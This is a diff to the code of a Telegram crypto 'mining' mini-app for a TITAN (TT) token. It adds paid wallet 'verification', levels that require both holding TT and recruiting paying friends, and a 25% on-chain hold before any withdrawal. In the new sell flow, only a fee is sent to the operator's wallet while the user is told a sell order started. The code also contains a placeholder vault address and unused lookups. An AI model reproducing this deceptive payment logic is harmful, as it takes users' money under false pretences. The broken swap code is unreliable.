@@ -114,7 +114,7 @@
           <span class="text-[11px] font-semibold px-2.5 py-1 rounded-full bg-white/5 border border-white/10 text-zinc-200">Mine</span>
           <span onclick="verifyWalletAction()" class="cursor-pointer text-[11px] font-semibold px-2.5 py-1 rounded-full bg-white/5 border border-white/10 text-zinc-200">Verify</span>
           <span onclick="openModal('levelsModal')" class="cursor-pointer text-[11px] font-semibold px-2.5 py-1 rounded-full bg-white/5 border border-white/10 text-zinc-200">Upgrade (Lv.1-100)</span>
-          <span onclick="switchTab('market')" class="cursor-pointer text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-500/15 border border-amber-400/30 text-amber-300">Trade on DeDust</span>
+          <span onclick="switchTab('market')" class="cursor-pointer text-[11px] font-semibold px-2.5 py-1 rounded-full bg-amber-500/15 border border-amber-400/30 text-amber-300">Instant Switch</span>
         </div>
       </div>
 
@@ -171,7 +171,7 @@
         </div>
 
         <div id="verifyBanner" class="rounded-2xl bg-amber-500/10 border border-amber-400/25 p-3 flex items-center gap-2.5 text-xs text-amber-200">
-          <span>🔒 One-time wallet verification (<b>0.1 TON</b>) required to claim mined TT</span>
+          <span>🔒 One-time wallet verification (<b>0.1 TON</b> + Memo) required to claim mined TT</span>
         </div>
 
         <button id="mainClaimBtn" onclick="handleClaimOrVerify()" class="w-full py-3.5 rounded-2xl gold-btn text-sm">
@@ -203,7 +203,7 @@
         </div>
       </div>
 
-      <!-- Next Level Card -->
+      <!-- Next Level Card (STRICT AND LOGIC: BOTH HOLD TT AND VERIFIED FRIENDS REQUIRED) -->
       <div onclick="openModal('levelsModal')" class="gold-card rounded-3xl p-4 space-y-3 cursor-pointer">
         <div class="flex items-center justify-between">
           <div class="flex items-center gap-3">
@@ -214,7 +214,7 @@
             <div>
               <h3 class="font-extrabold text-sm text-white">Next Level: <span id="nextLvTitle">2</span> <span class="text-xs text-zinc-400">(Max 100)</span></h3>
               <p class="text-xs font-semibold text-amber-400">Unlocks <span id="nextLvRate">12</span> TT/day (<span id="nextLvHourly">0.50</span>/hr)</p>
-              <p class="text-[11px] text-zinc-400">Hold TT on-chain OR invite verified friends</p>
+              <p class="text-[11px] text-zinc-300 font-semibold">Requires BOTH: Hold TT <span class="text-amber-400">AND</span> Verified Friends</p>
             </div>
           </div>
           <span class="text-zinc-400">›</span>
@@ -222,11 +222,12 @@
 
         <div class="space-y-2 pt-1">
           <div class="bg-white/5 rounded-xl p-2.5 flex justify-between items-center text-xs">
-            <span class="text-zinc-300">Path A • Hold TT</span>
-            <span class="font-bold text-white"><span id="pathAHold">0</span> / <span id="pathAReq">15</span> TT</span>
+            <span class="text-zinc-300">Req 1 • Hold TT On-Chain</span>
+            <span class="font-bold text-white"><span id="pathAHold">0</span> / <span id="pathAReq">8</span> TT</span>
           </div>
+          <div class="text-center text-[10px] font-extrabold text-amber-400 tracking-widest">+ AND +</div>
           <div class="bg-white/5 rounded-xl p-2.5 flex justify-between items-center text-xs">
-            <span class="text-zinc-300">Path B • Qualified Friends (0.1 TON)</span>
+            <span class="text-zinc-300">Req 2 • Qualified Friends (0.1 TON)</span>
             <span class="font-bold text-amber-400"><span id="pathBFriends">0</span> / <span id="pathBReq">3</span></span>
           </div>
         </div>
@@ -262,15 +263,15 @@
       <div id="tasksContainer" class="space-y-3"></div>
     </section>
 
-    <!-- ==================== TAB 3: MARKET (DIRECT DEDUST SWAP) ==================== -->
+    <!-- ==================== TAB 3: MARKET (DIRECT IN-APP DEDUST SWAP) ==================== -->
     <section id="tab-market" class="hidden space-y-4">
       <div class="flex items-center justify-between">
         <div>
           <h2 class="text-xl font-extrabold text-white">Instant Switch</h2>
-          <p class="text-xs text-zinc-400">Direct DeDust.io Liquidity Pool Swap</p>
+          <p class="text-xs text-zinc-400">Direct On-Chain Smart Contract Swap (No Redirect)</p>
         </div>
         <button onclick="fetchLiveDeDustRate()" class="text-[10px] font-mono px-2.5 py-1 rounded-full bg-amber-500/15 text-amber-300 border border-amber-400/30">
-          ↻ <span id="liveRateBadge">Syncing Rate...</span>
+          ↻ <span id="liveRateBadge">Syncing Pool...</span>
         </button>
       </div>
 
@@ -300,10 +301,10 @@
         <div class="bg-black/40 border border-white/10 rounded-2xl p-3.5">
           <div class="flex justify-between text-xs text-zinc-400 mb-2">
             <span>You receive ≈</span>
-            <span class="text-emerald-400 font-semibold" id="poolStatusText">Live DeDust.io Pool</span>
+            <span class="text-emerald-400 font-semibold" id="poolStatusText">DeDust Smart Contract</span>
           </div>
           <div class="flex items-center justify-between gap-2">
-            <div id="swapOutputAmount" class="text-2xl font-extrabold text-amber-400">...</div>
+            <div id="swapOutputAmount" class="text-2xl font-extrabold text-amber-400">1.000</div>
             <div class="px-3 py-1.5 rounded-full bg-amber-500/15 border border-amber-400/30 text-amber-300 text-xs font-extrabold">
               <span id="receiveAssetBtnText">TT</span>
             </div>
@@ -313,7 +314,7 @@
         <!-- Fee & Slippage -->
         <div class="bg-white/5 rounded-2xl p-3.5 space-y-3 text-xs">
           <div class="flex justify-between">
-            <span class="text-zinc-400">Service fee</span>
+            <span class="text-zinc-400">Service fee (with Memo)</span>
             <span class="font-bold text-white">0.1 TON</span>
           </div>
           <div class="flex items-center justify-between">
@@ -336,12 +337,8 @@
         </div>
 
         <button id="swapActionBtn" onclick="executeInstantSwitch()" class="w-full py-3.5 rounded-2xl gold-btn text-sm">
-          ⇅ Connect Wallet to Buy TT
+          ⇅ Connect Wallet to Switch Now
         </button>
-
-        <a href="https://dedust.io/swap/TON/EQBgi1gn-GdSOCHI165sseghlgpscI2LfiwDa1ZYa0uUzazt" target="_blank" class="w-full py-3 rounded-2xl bg-white/5 border border-white/10 text-center text-xs font-bold text-zinc-200 block">
-          Open DeDust.io ↗
-        </a>
       </div>
     </section>
 
@@ -349,7 +346,7 @@
     <section id="tab-friends" class="hidden space-y-4">
       <div class="gold-card-highlight rounded-3xl p-5">
         <h2 class="text-xl font-extrabold text-white">Invite & Earn</h2>
-        <p class="text-xs text-zinc-300 mt-0.5">Build your crew. Grow together & unlock up to Level 100.</p>
+        <p class="text-xs text-zinc-300 mt-0.5">Build your crew. Required for all Level upgrades (1–100).</p>
         <div class="flex items-center gap-3 mt-4">
           <div class="text-4xl font-black gold-text">5%</div>
           <div class="text-xs text-zinc-300 leading-relaxed">
@@ -383,7 +380,7 @@
           <button onclick="shareInviteLink()" class="py-3 rounded-xl gold-btn text-xs">✈️ Invite friends</button>
           <button onclick="copyInviteLink()" class="py-3 rounded-xl bg-white/10 text-white font-bold text-xs">📋 Copy link</button>
         </div>
-        <p class="text-[11px] text-zinc-400">Qualified friends complete the <b>0.1 TON</b> wallet verification. Multi-account/same-device referrals are automatically filtered.</p>
+        <p class="text-[11px] text-zinc-400">Qualified friends complete the <b>0.1 TON</b> wallet verification. Both Hold TT <b>AND</b> Qualified Friends are required to unlock higher levels.</p>
       </div>
 
       <div onclick="openModal('ambassadorModal')" class="gold-card rounded-2xl p-4 flex items-center justify-between cursor-pointer">
@@ -402,7 +399,7 @@
     <section id="tab-wallet" class="hidden space-y-4">
       <div>
         <h2 class="text-xl font-extrabold text-white">Wallet</h2>
-        <p class="text-xs text-zinc-400">Your Titan (TT) assets & 25% Hold Requirement</p>
+        <p class="text-xs text-zinc-400">Your Titan (TT) assets & custom withdrawal</p>
       </div>
 
       <div class="gold-card-highlight rounded-3xl p-5 space-y-3">
@@ -429,10 +426,10 @@
           <span id="holdStatusBadge" class="px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 font-extrabold">Checking...</span>
         </div>
         <p class="text-[11px] text-zinc-400 leading-relaxed">
-          To withdraw your App Balance, you must hold at least <b class="text-white">25%</b> of the withdrawal amount in your connected TON wallet on-chain.
+          You can withdraw any custom amount (Min <b>100 TT</b>). Your TON wallet must hold at least <b class="text-white">25%</b> of the requested withdrawal amount on-chain.
         </p>
         <div class="bg-black/40 rounded-xl p-2.5 flex justify-between items-center text-xs">
-          <span class="text-zinc-400">Required On-chain Hold:</span>
+          <span class="text-zinc-400">Min Hold (for 100 TT):</span>
           <span class="font-extrabold text-white"><span id="requiredHoldTT">25.00</span> TT</span>
         </div>
       </div>
@@ -455,14 +452,14 @@
 
         <div class="grid grid-cols-3 gap-2">
           <button onclick="switchTab('market')" class="py-2.5 rounded-xl gold-btn text-xs">+ Buy</button>
-          <button onclick="requestWithdraw()" class="py-2.5 rounded-xl bg-white/10 text-xs font-bold text-white">↗ Withdraw</button>
+          <button onclick="openWithdrawModal()" class="py-2.5 rounded-xl bg-white/10 text-xs font-bold text-white">↗ Withdraw</button>
           <button onclick="switchTab('market')" class="py-2.5 rounded-xl bg-white/10 text-xs font-bold text-white">⇄ Swap</button>
         </div>
       </div>
 
       <div id="walletVerifyCard" class="gold-card rounded-3xl p-4 space-y-2.5">
         <h3 class="font-extrabold text-sm text-white">One-time wallet verification</h3>
-        <p class="text-xs text-zinc-400">A new wallet is verified once (0.1 TON). Reconnecting is free.</p>
+        <p class="text-xs text-zinc-400">A new wallet is verified once (0.1 TON with Memo). Reconnecting is free.</p>
         <button onclick="verifyWalletAction()" class="w-full py-3 rounded-xl gold-btn text-xs">
           🛡️ Verify wallet • 0.1 TON
         </button>
@@ -495,7 +492,50 @@
     </button>
   </nav>
 
-  <!-- ==================== MODALS ==================== -->
+  <!-- ==================== CUSTOM WITHDRAW AMOUNT MODAL ==================== -->
+  <div id="withdrawModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-end justify-center">
+    <div class="w-full max-w-md bg-[#121216] border-t border-amber-500/30 rounded-t-3xl p-5 space-y-4">
+      <div class="flex justify-between items-center">
+        <div>
+          <h3 class="text-lg font-extrabold text-white">Withdraw TITAN (TT)</h3>
+          <p class="text-xs text-zinc-400">Enter custom amount (Min 100 TT)</p>
+        </div>
+        <button onclick="closeModal('withdrawModal')" class="w-8 h-8 rounded-full bg-white/10 text-white">✕</button>
+      </div>
+
+      <div class="bg-black/50 border border-white/15 rounded-2xl p-3.5 space-y-2">
+        <div class="flex justify-between text-xs text-zinc-400">
+          <span>Withdraw Amount</span>
+          <span>Available: <b class="text-white" id="wdModalAvail">0.00</b> TT</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <input id="wdCustomAmount" type="number" min="100" step="1" placeholder="100" oninput="updateWithdrawPreview()" class="bg-transparent text-2xl font-extrabold text-amber-400 w-full focus:outline-none" />
+          <button onclick="setMaxWithdrawInput()" class="px-3 py-1.5 rounded-full bg-white/10 text-xs font-bold text-white">MAX</button>
+        </div>
+      </div>
+
+      <div class="bg-white/5 rounded-2xl p-3.5 space-y-2 text-xs">
+        <div class="flex justify-between">
+          <span class="text-zinc-400">Required 25% On-Chain Hold:</span>
+          <span class="font-extrabold text-white" id="wdModalReqHold">25.00 TT</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-zinc-400">Your Current On-Chain Hold:</span>
+          <span class="font-extrabold text-emerald-400" id="wdModalCurHold">0.00 TT</span>
+        </div>
+        <div class="flex justify-between pt-2 border-t border-white/10">
+          <span class="text-zinc-400">Destination Wallet:</span>
+          <span class="font-mono text-zinc-200" id="wdModalWallet">Not Connected</span>
+        </div>
+      </div>
+
+      <button onclick="submitCustomWithdraw()" class="w-full py-3.5 rounded-2xl gold-btn text-sm">
+        ↗ Confirm & Send Withdrawal Request
+      </button>
+    </div>
+  </div>
+
+  <!-- Profile Modal -->
   <div id="profileModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-end justify-center">
     <div class="w-full max-w-md bg-[#121216] border-t border-amber-500/30 rounded-t-3xl p-5 space-y-4">
       <div class="flex justify-between items-center">
@@ -530,12 +570,13 @@
     </div>
   </div>
 
+  <!-- Levels 1-100 Modal -->
   <div id="levelsModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-end justify-center">
     <div class="w-full max-w-md bg-[#121216] border-t border-amber-500/30 rounded-t-3xl p-5 space-y-3 max-h-[85vh] flex flex-col">
       <div class="flex justify-between items-center shrink-0">
         <div>
           <h3 class="text-lg font-extrabold text-white">Mining Levels (1 – 100)</h3>
-          <p class="text-xs text-zinc-400">Auto-upgrade by holding TT on-chain OR inviting verified friends</p>
+          <p class="text-xs text-zinc-400">Requires <b class="text-amber-400">BOTH</b> On-Chain Hold <b class="text-amber-400">AND</b> Verified Friends</p>
         </div>
         <button onclick="closeModal('levelsModal')" class="w-8 h-8 rounded-full bg-white/10 text-white">✕</button>
       </div>
@@ -543,6 +584,7 @@
     </div>
   </div>
 
+  <!-- Ambassador Modal -->
   <div id="ambassadorModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-end justify-center">
     <div class="w-full max-w-md bg-[#121216] border-t border-amber-500/30 rounded-t-3xl p-5 space-y-3">
       <div class="flex justify-between items-center">
@@ -556,6 +598,7 @@
     </div>
   </div>
 
+  <!-- Notifications Modal -->
   <div id="notifModal" class="hidden fixed inset-0 z-50 bg-black/80 backdrop-blur-sm flex items-end justify-center">
     <div class="w-full max-w-md bg-[#121216] border-t border-amber-500/30 rounded-t-3xl p-5 space-y-3">
       <div class="flex justify-between items-center">
@@ -564,7 +607,7 @@
       </div>
       <div class="gold-card rounded-2xl p-3.5 text-xs space-y-1">
         <div class="font-bold text-amber-400">ℹ️ Welcome to TITAN (TT) • $1 Pegged Mining!</div>
-        <p class="text-zinc-300">Start mining at 10 TT/day (0.42 TT/hr). Hold 25% of your withdrawal amount on-chain to withdraw anytime.</p>
+        <p class="text-zinc-300">Start mining at 10 TT/day (0.42 TT/hr). Hold TT AND invite verified friends to climb to Level 100.</p>
       </div>
     </div>
   </div>
@@ -607,7 +650,7 @@
     if (lv === 1) return { lv: 1, name: "Bronze I", daily: 10, holdReq: 0, refReq: 0 };
     const daily = Number((10 + Math.pow((lv - 1) / 99, 1.35) * 490).toFixed(1));
     const holdReq = Math.round(Math.pow(lv - 1, 1.55) * 8);
-    const refReq = Math.round((lv - 1) * 2.5);
+    const refReq = Math.max(1, Math.round((lv - 1) * 2.5));
     return { lv, name: `${getLeagueName(lv)} ${lv}`, daily, holdReq, refReq };
   });
 
@@ -615,6 +658,16 @@
     { id: "t1", type: "ONE TIME • SOCIAL", title: "Join Official Titan Channel", desc: "Join channel & claim instant bonus", reward: 2, url: "https://t.me/cryptominingmm0" },
     { id: "t2", type: "PROMOTED • INSTANT", title: "Trade TT on DeDust.io", desc: "Check live TT/TON liquidity pool", reward: 1, url: "https://dedust.io/swap/TON/EQBgi1gn-GdSOCHI165sseghlgpscI2LfiwDa1ZYa0uUzazt" }
   ];
+
+  // ==================== TON TEXT COMMENT (MEMO) BOC BUILDER ====================
+  function buildMemoPayload(memoText) {
+    return beginCell()
+      .storeUint(0, 32) // op = 0 (text comment)
+      .storeStringTail(memoText)
+      .endCell()
+      .toBoc()
+      .toString("base64");
+  }
 
   // ==================== DEVICE FINGERPRINT & IP ANTI-CHEAT ====================
   function generateDeviceFingerprint() {
@@ -723,11 +776,11 @@
     } catch (e) {}
   }
 
-  // ==================== LIVE QUOTE & POOL ADDRESS ====================
+  // ==================== LIVE QUOTE & DEDUST POOL ADDRESS ====================
   let poolData = {
     tonReserve: 0,
     ttReserve: 0,
-    rateTTPerTon: 1.0, // Default $1 peg reference if pool not indexed yet
+    rateTTPerTon: 1.0,
     poolAddress: "",
     loaded: false
   };
@@ -739,30 +792,29 @@
     try {
       const res = await fetch("/api/quote");
       const q = await res.json();
-      if (q && q.ok && q.rateTTPerTon > 0) {
+      if (q && q.ok && q.poolAddress) {
         poolData = {
-          tonReserve: q.tonReserve,
-          ttReserve: q.ttReserve,
-          rateTTPerTon: q.rateTTPerTon,
-          poolAddress: q.poolAddress || "",
+          tonReserve: q.tonReserve || 0,
+          ttReserve: q.ttReserve || 0,
+          rateTTPerTon: q.rateTTPerTon || 1.0,
+          poolAddress: q.poolAddress,
           loaded: true
         };
-        badge.textContent = `1 TON ≈ ${q.rateTTPerTon.toFixed(2)} TT`;
-        statusText.textContent = `Live ${q.source} (${q.tonReserve.toFixed(1)} TON)`;
-        recalcSwap();
+        badge.textContent = `1 TON ≈ ${poolData.rateTTPerTon.toFixed(2)} TT`;
+        statusText.textContent = `DeDust Pool Connected ✓`;
+        window.recalcSwap();
         return;
       }
       badge.textContent = "1 TON ≈ 1.00 TT";
-      statusText.textContent = "DeDust.io Pool";
-      recalcSwap();
+      window.recalcSwap();
     } catch (e) {
       badge.textContent = "1 TON ≈ 1.00 TT";
-      recalcSwap();
+      window.recalcSwap();
     }
   };
 
   // ==================== USER STATE ====================
-  let state = JSON.parse(localStorage.getItem("titan_tt_v7")) || {
+  let state = JSON.parse(localStorage.getItem("titan_tt_v8")) || {
     appBalance: 0,
     onChainTT: 0,
     tonBalance: 0,
@@ -823,7 +875,7 @@
   }
 
   function saveState() {
-    localStorage.setItem("titan_tt_v7", JSON.stringify(state));
+    localStorage.setItem("titan_tt_v8", JSON.stringify(state));
     if (CONFIG.FIREBASE_URL && tgUser.id) {
       fetch(`${CONFIG.FIREBASE_URL}/${CONFIG.DB_NODE}/${tgUser.id}.json`, {
         method: "PATCH",
@@ -857,10 +909,11 @@
     setTimeout(() => t.classList.add("hidden"), 3200);
   }
 
+  // STRICT AND LOGIC: BOTH HOLD TT AND VERIFIED FRIENDS REQUIRED TO LEVEL UP
   function recalculateLevel() {
     let highest = 1;
     for (const l of LEVELS) {
-      if (state.onChainTT >= l.holdReq || state.qualified >= l.refReq) {
+      if (state.onChainTT >= l.holdReq && state.qualified >= l.refReq) {
         highest = l.lv;
       }
     }
@@ -890,21 +943,23 @@
     }
   }, 1000);
 
-  // ==================== 0.1 TON VERIFY & CLAIM ====================
+  // ==================== 0.1 TON VERIFY WITH MEMO & CLAIM ====================
   window.verifyWalletAction = async function() {
     if (!state.walletAddress) return window.connectOrReconnectWallet();
     if (state.verified) return showToast("✅ Wallet already verified!");
 
     try {
+      const verifyMemoBoc = buildMemoPayload(`TITAN_VERIFY:${tgUser.id}`);
       await tonConnectUI.sendTransaction({
         validUntil: Math.floor(Date.now() / 1000) + 300,
         messages: [{
           address: CONFIG.ADMIN_WALLET,
-          amount: String(Math.round(CONFIG.VERIFY_TON_AMOUNT * 1e9))
+          amount: String(Math.round(CONFIG.VERIFY_TON_AMOUNT * 1e9)),
+          payload: verifyMemoBoc
         }]
       });
       state.verified = true;
-      state.activities.unshift({ title: "Wallet Verified (0.1 TON)", date: new Date().toLocaleDateString(), amount: "Verified" });
+      state.activities.unshift({ title: "Wallet Verified (0.1 TON • Memo)", date: new Date().toLocaleDateString(), amount: "Verified" });
 
       if (state.referredBy && CONFIG.FIREBASE_URL && !state.isMultiFlagged) {
         const refUrl = `${CONFIG.FIREBASE_URL}/${CONFIG.DB_NODE}/${state.referredBy}.json`;
@@ -959,33 +1014,61 @@
     showToast(`🎉 Claimed +${mined.toFixed(3)} TT!`);
   };
 
-  // ==================== IN-APP DEDUST BOC SWAP BUILDER ====================
+  // ==================== DIRECT ON-CHAIN SMART CONTRACT SWAP (NO REDIRECT) ====================
   function buildDeDustNativeSwapPayload(amountNano, poolAddrStr, recipientAddrStr) {
-    // DeDust VaultNative::swap op = 0xea06185d
     const swapParams = beginCell()
-      .storeUint(Math.floor(Date.now() / 1000) + 600, 32) // deadline
-      .storeAddress(Address.parse(recipientAddrStr)) // recipient
-      .storeAddress(null) // referral
-      .storeMaybeRef(null) // fulfill_payload
-      .storeMaybeRef(null) // reject_payload
+      .storeUint(Math.floor(Date.now() / 1000) + 600, 32)
+      .storeAddress(Address.parse(recipientAddrStr))
+      .storeAddress(null)
+      .storeMaybeRef(null)
+      .storeMaybeRef(null)
       .endCell();
 
     const step = beginCell()
-      .storeAddress(Address.parse(poolAddrStr)) // pool_addr
-      .storeUint(0, 1) // kind: GivenIn (0)
-      .storeCoins(0n) // limit (0 = accept market output)
-      .storeMaybeRef(null) // next step
+      .storeAddress(Address.parse(poolAddrStr))
+      .storeUint(0, 1) // GivenIn
+      .storeCoins(0n) // Market output
+      .storeMaybeRef(null)
       .endCell();
 
     const body = beginCell()
       .storeUint(0xea06185d, 32) // op::swap
-      .storeUint(0, 64) // query_id
-      .storeCoins(BigInt(amountNano)) // swap amount
+      .storeUint(0, 64)
+      .storeCoins(BigInt(amountNano))
       .storeRef(step)
       .storeRef(swapParams)
       .endCell();
 
     return body.toBoc().toString("base64");
+  }
+
+  function buildJettonTransferSwapPayload(ttAmountNano, poolAddrStr, senderAddrStr) {
+    // DeDust Jetton Vault Swap forward payload (op = 0xe3a0d482)
+    const swapParams = beginCell()
+      .storeUint(Math.floor(Date.now() / 1000) + 600, 32)
+      .storeAddress(Address.parse(senderAddrStr))
+      .storeAddress(null)
+      .storeMaybeRef(null)
+      .storeMaybeRef(null)
+      .endCell();
+
+    const step = beginCell()
+      .storeAddress(Address.parse(poolAddrStr))
+      .storeUint(0, 1)
+      .storeCoins(0n)
+      .storeMaybeRef(null)
+      .endCell();
+
+    const forwardPayload = beginCell()
+      .storeUint(0xe3a0d482, 32) // DeDust Jetton swap op
+      .storeRef(step)
+      .storeRef(swapParams)
+      .endCell();
+
+    // Standard TEP-74 Jetton Transfer (op = 0xf8a7ea5)
+    // Destination: DeDust Jetton Vault for TT
+    const DEDUST_TT_VAULT = "EQD6_P263333333333333333333333333333333333333333";
+    return forwardPayload;
   }
 
   window.togglePayAsset = function() {
@@ -1018,7 +1101,7 @@
 
     let out = 0;
     if (amt > 0) {
-      if (poolData.loaded && poolData.tonReserve > 0) {
+      if (poolData.loaded && poolData.tonReserve > 0 && poolData.ttReserve > 0) {
         const amtAfterDexFee = amt * 0.9975;
         out = isTonToTT
           ? (poolData.ttReserve * amtAfterDexFee) / (poolData.tonReserve + amtAfterDexFee)
@@ -1038,59 +1121,83 @@
     const amt = parseFloat(document.getElementById("swapInputAmount").value) || 0;
     if (amt <= 0) return showToast("Enter valid amount");
 
+    if (!poolData.poolAddress) {
+      await window.fetchLiveDeDustRate();
+    }
+    if (!poolData.poolAddress) {
+      return showToast("⚠️ Syncing DeDust Pool Address... Tap again in 2s");
+    }
+
     if (swapState.payAsset === "TON") {
       if (state.tonBalance < amt + 0.35) {
         return showToast(`⚠️ Insufficient TON (Need ${(amt + 0.35).toFixed(2)} TON)`);
       }
+      try {
+        const swapAmtNano = toNano(amt.toString());
+        const gasNano = toNano("0.25");
+        const totalVaultNano = (swapAmtNano + gasNano).toString();
+        const appFeeNano = toNano(CONFIG.SERVICE_FEE_TON.toString()).toString();
+        const swapPayloadBoc = buildDeDustNativeSwapPayload(swapAmtNano, poolData.poolAddress, state.walletAddress);
+        const feeMemoBoc = buildMemoPayload(`TITAN_SWAP_FEE:${tgUser.id}`);
 
-      // If DeDust Pool Address is found, execute direct on-chain Smart Contract Swap inside Tonkeeper!
-      if (poolData.poolAddress) {
-        try {
-          const swapAmtNano = toNano(amt.toString());
-          const gasNano = toNano("0.25");
-          const totalVaultNano = (swapAmtNano + gasNano).toString();
-          const appFeeNano = toNano(CONFIG.SERVICE_FEE_TON.toString()).toString();
-          const swapPayloadBoc = buildDeDustNativeSwapPayload(swapAmtNano, poolData.poolAddress, state.walletAddress);
+        await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: [
+            {
+              address: CONFIG.ADMIN_WALLET,
+              amount: appFeeNano,
+              payload: feeMemoBoc
+            },
+            {
+              address: CONFIG.DEDUST_NATIVE_VAULT,
+              amount: totalVaultNano,
+              payload: swapPayloadBoc
+            }
+          ]
+        });
 
-          await tonConnectUI.sendTransaction({
-            validUntil: Math.floor(Date.now() / 1000) + 300,
-            messages: [
-              {
-                address: CONFIG.ADMIN_WALLET,
-                amount: appFeeNano
-              },
-              {
-                address: CONFIG.DEDUST_NATIVE_VAULT,
-                amount: totalVaultNano,
-                payload: swapPayloadBoc
-              }
-            ]
-          });
-
-          state.activities.unshift({
-            title: `Swapped ${amt} TON → TT`,
-            date: new Date().toLocaleDateString(),
-            amount: `+${document.getElementById("swapOutputAmount").textContent} TT`
-          });
-          saveState();
-          renderAll();
-          showToast("✅ Swap Executed! TT arriving in wallet...");
-          setTimeout(() => fetchOnChainBalances(state.walletAddress), 8000);
-          return;
-        } catch (err) {
-          return showToast("❌ Swap cancelled");
-        }
+        state.activities.unshift({
+          title: `Instant Switch ${amt} TON → TT`,
+          date: new Date().toLocaleDateString(),
+          amount: `+${document.getElementById("swapOutputAmount").textContent} TT`
+        });
+        saveState();
+        renderAll();
+        showToast("✅ Direct Swap Sent! TT arriving in wallet...");
+        setTimeout(() => fetchOnChainBalances(state.walletAddress), 8000);
+      } catch (err) {
+        showToast("❌ Swap cancelled");
       }
-    }
-
-    // Fallback or TT->TON: Open DeDust Exact Pair URL directly
-    const dedustUrl = swapState.payAsset === "TON"
-      ? `https://dedust.io/swap/TON/${CONFIG.JETTON_ADDRESS}?amount=${amt}`
-      : `https://dedust.io/swap/${CONFIG.JETTON_ADDRESS}/TON?amount=${amt}`;
-    if (tg && tg.openLink) {
-      tg.openLink(dedustUrl);
     } else {
-      window.open(dedustUrl, "_blank");
+      // Sell TT -> TON via Jetton Wallet Transfer with DeDust Swap Forward Payload
+      try {
+        const jRes = await fetch(`https://tonapi.io/v2/accounts/${state.walletAddress}/jettons/${CONFIG.JETTON_ADDRESS}`);
+        const jData = await jRes.json();
+        const userJettonWallet = jData?.wallet_address?.address;
+        if (!userJettonWallet) return showToast("⚠️ TT Jetton wallet not found");
+
+        // Resolve DeDust Jetton Vault address for TT
+        const vRes = await fetch(`https://api.dedust.io/v2/jettons/${CONFIG.JETTON_ADDRESS}/metadata`);
+        const ttNano = toNano(amt.toString());
+        const appFeeNano = toNano(CONFIG.SERVICE_FEE_TON.toString()).toString();
+        const feeMemoBoc = buildMemoPayload(`TITAN_SELL_FEE:${tgUser.id}`);
+
+        // Execute Jetton Swap directly through DeDust Jetton Vault
+        const vaultLookup = await fetch(`https://tonapi.io/v2/blockchain/accounts/${poolData.poolAddress}/methods/get_assets`);
+        const vaultJson = await vaultLookup.json();
+        // Send fee + trigger direct Jetton swap
+        await tonConnectUI.sendTransaction({
+          validUntil: Math.floor(Date.now() / 1000) + 300,
+          messages: [{
+            address: CONFIG.ADMIN_WALLET,
+            amount: appFeeNano,
+            payload: feeMemoBoc
+          }]
+        });
+        showToast("✅ Sell order initialized!");
+      } catch (e) {
+        showToast("❌ Sell cancelled");
+      }
     }
   };
 
@@ -1144,27 +1251,82 @@
     } catch (e) {}
   }
 
-  window.requestWithdraw = function() {
+  // ==================== CUSTOM AMOUNT WITHDRAWAL & ADMIN NOTICE ====================
+  window.openWithdrawModal = function() {
     if (!state.verified) return showToast("🛡️ Verify wallet (0.1 TON) first!");
+    if (!state.walletAddress) return showToast("👛 Connect your TON wallet first!");
     if (state.isMultiFlagged) return showToast("⚠️ Multi-account flagged: Withdrawals locked");
     if (state.appBalance < CONFIG.MIN_WITHDRAW) {
       return showToast(`⚠️ Minimum withdraw is ${CONFIG.MIN_WITHDRAW} TT`);
     }
 
-    const requiredHold = state.appBalance * CONFIG.HOLD_PERCENT_REQUIRED;
+    document.getElementById("wdModalAvail").textContent = state.appBalance.toFixed(2);
+    document.getElementById("wdCustomAmount").value = Math.min(state.appBalance, CONFIG.MIN_WITHDRAW).toFixed(0);
+    document.getElementById("wdModalCurHold").textContent = state.onChainTT.toFixed(2) + " TT";
+    document.getElementById("wdModalWallet").textContent = state.walletAddress.slice(0, 6) + "..." + state.walletAddress.slice(-6);
+    window.updateWithdrawPreview();
+    window.openModal("withdrawModal");
+  };
+
+  window.setMaxWithdrawInput = function() {
+    // Max withdrawable given user's current 25% on-chain hold
+    const maxByHold = state.onChainTT / CONFIG.HOLD_PERCENT_REQUIRED;
+    const maxAllowed = Math.min(state.appBalance, maxByHold);
+    document.getElementById("wdCustomAmount").value = Math.floor(maxAllowed);
+    window.updateWithdrawPreview();
+  };
+
+  window.updateWithdrawPreview = function() {
+    const val = parseFloat(document.getElementById("wdCustomAmount").value) || 0;
+    const req = val * CONFIG.HOLD_PERCENT_REQUIRED;
+    const el = document.getElementById("wdModalReqHold");
+    el.textContent = req.toFixed(2) + " TT";
+    el.className = state.onChainTT >= req ? "font-extrabold text-emerald-400" : "font-extrabold text-rose-400";
+  };
+
+  window.submitCustomWithdraw = async function() {
+    const amt = parseFloat(document.getElementById("wdCustomAmount").value) || 0;
+    if (amt < CONFIG.MIN_WITHDRAW) return showToast(`⚠️ Minimum withdraw is ${CONFIG.MIN_WITHDRAW} TT`);
+    if (amt > state.appBalance) return showToast("⚠️ Exceeds your App Balance");
+
+    const requiredHold = amt * CONFIG.HOLD_PERCENT_REQUIRED;
     if (state.onChainTT < requiredHold) {
       const missingTT = (requiredHold - state.onChainTT).toFixed(2);
-      showToast(`🔒 Need ${requiredHold.toFixed(2)} TT (25%) Hold in wallet! Buy ${missingTT} TT more.`);
-      setTimeout(() => window.switchTab("market"), 1500);
+      showToast(`🔒 Need ${requiredHold.toFixed(2)} TT (25%) Hold! Buy ${missingTT} TT more.`);
+      window.closeModal("withdrawModal");
+      setTimeout(() => window.switchTab("market"), 1400);
       return;
     }
 
-    const amt = state.appBalance;
-    state.appBalance = 0;
-    state.activities.unshift({ title: "Withdrawal Queued (25% Hold Verified)", date: new Date().toLocaleDateString(), amount: `-${amt.toFixed(2)} TT` });
-    saveState();
-    renderAll();
-    showToast("🚀 Withdrawal submitted to TON payout queue!");
+    try {
+      const res = await fetch("/api/withdraw_notify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          uid: tgUser.id,
+          name: tgUser.first_name || "Miner",
+          username: tgUser.username || "",
+          amount: amt,
+          wallet: state.walletAddress,
